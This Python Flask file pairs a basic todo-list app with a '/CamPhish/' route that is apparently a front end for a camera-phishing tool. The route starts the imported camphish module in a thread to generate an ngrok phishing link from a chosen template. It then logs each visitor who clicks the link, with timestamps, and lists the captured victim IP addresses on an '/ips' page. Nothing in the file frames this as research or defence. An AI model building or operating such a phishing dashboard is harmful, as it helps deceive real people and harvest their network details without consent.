#!/usr/bin/python
import time
from typing import List

from flask import Flask, render_template, request, redirect
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timezone
import camphish
import threading

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

times = list()

class Todo(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    content = db.Column(db.String(200), nullable=False)
    date_created = db.Column(db.DateTime, default=datetime.now(timezone.utc))

    def __repr__(self):
        return '<Task %r' % self.id


@app.route('/', methods=['POST', 'GET'])
def index():
    if request.method == 'POST':
        task_content = request.form['content']
        new_task = Todo(content=task_content)
        try:
            db.session.add(new_task)
            db.session.commit( )
            return redirect('/')
        except:
            return 'There was an Issue adding your task to the database'

    else:
        tasks = Todo.query.order_by(Todo.date_created).all( )
        return render_template('index.html', tasks=tasks)


@app.route('/delete/<int:id>')
def delete(id):
    task_to_delete = Todo.query.get_or_404(id)

    try:
        db.session.delete(task_to_delete)
        db.session.commit( )
        return redirect('/')
    except:
        return "There was a Problem deleting that Task"


@app.route('/update/<int:id>', methods=['GET', 'POST'])
def update(id):
    task = Todo.query.get_or_404(id)
    if request.method == 'POST':
        task.content = request.form['content']

        try:
            db.session.commit( )
            return redirect('/')
        except:
            return 'There was an issue updating your Task'
    else:
        return render_template('update.html', task=task)


@app.route('/CamPhish/', methods=['GET', 'POST'])
def camphish_create() -> str:
    if request.method == 'GET':
        return render_template('Camphish.html', ngrok_url=None)
    else:
        service = request.form.get('port_forwarding')
        template = request.form.get('template')
        auth = "test"
        # ngrok_url = camphish.camphish(int(service), int(template), autthoken=auth)

        ngrok_url_thread = threading.Thread(target=camphish.camphish, args=(int(service), int(template), auth),
                                            daemon=True)
        ngrok_url_thread.start( )

        print('FUNKTION GESTARTET')

        # print(service, template, ngrok_url)

        def check_connection():
            print('davor')
            before_connections = list( )
            global times
            print(before_connections)
            while True:
                if before_connections != camphish.output.connections:
                    before_connections = camphish.output.connections
                    print('Link geklickt')
                    camphish.output.old_connections.append(camphish.output.connections[0])
                    times.append(datetime.now(timezone.utc))
                    camphish.output.connections.clear( )
                    time.sleep(2)
                else:
                    time.sleep(2)

        check_thread = threading.Thread(target=check_connection, daemon=True)
        print('Startet Thread')
        check_thread.start( )
        print('Thread gestartet')
        while camphish.output.link is None:
            pass
        return render_template('Camphish.html', ngrok_url=camphish.output.link)


@app.route('/ips')
def return_ips():
    return render_template('ips.html', ips=camphish.output.old_connections, time = times)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
